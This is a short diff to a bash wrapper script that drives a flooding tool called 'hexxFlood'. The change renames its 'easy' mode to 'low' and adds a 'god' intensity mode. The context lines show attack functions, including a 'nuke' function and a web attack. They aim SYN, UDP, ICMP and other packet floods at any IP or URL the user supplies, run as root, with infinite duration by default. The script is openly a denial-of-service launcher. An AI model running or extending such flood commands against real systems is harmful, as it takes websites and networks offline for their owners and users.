@@ -89,8 +89,8 @@ attack_local_nuke() {
 }
 
 attack_local_test() {
-    echo -e "${GREEN}🔥 Starting local test (Easy, 30s) on 192.168.1.14${NC}"
-    sudo hexxFlood -t 192.168.1.14 -m easy -D 30
+    echo -e "${GREEN}🔥 Starting local test (Low, 30s) on 192.168.1.14${NC}"
+    sudo hexxFlood -t 192.168.1.14 -m low -D 30
 }
 
 attack_web() {
@@ -122,8 +122,8 @@ attack_web_test() {
         echo "Usage: ./quick.sh web-test http://example.com"
         return 1
     fi
-    echo -e "${GREEN}🌐 Starting web test (Easy, 30s) on $url${NC}"
-    sudo hexxFlood -u "$url" -m easy -D 30
+    echo -e "${GREEN}🌐 Starting web test (Low, 30s) on $url${NC}"
+    sudo hexxFlood -u "$url" -m low -D 30
 }
 
 attack_lab() {
@@ -149,7 +149,7 @@ attack_custom() {
         echo "Web target detected"
         read -p "Threads (1-200, default: 50): " threads
         threads=${threads:-50}
-        read -p "Mode (easy/medium/high/extreme/apocalypse, default: high): " mode
+        read -p "Mode (low/medium/high/extreme/apocalypse/god, default: high): " mode
         mode=${mode:-high}
         read -p "Duration in seconds (0=infinite, default: 0): " duration
         duration=${duration:-0}
@@ -159,7 +159,7 @@ attack_custom() {
     else
         read -p "Threads (1-200, default: 50): " threads
         threads=${threads:-50}
-        read -p "Mode (easy/medium/high/extreme/apocalypse, default: high): " mode
+        read -p "Mode (low/medium/high/extreme/apocalypse/god, default: high): " mode
         mode=${mode:-high}
         read -p "Attack types (syn,udp,icmp,ack,rst,fin,all, default: all): " types
         types=${types:-all}
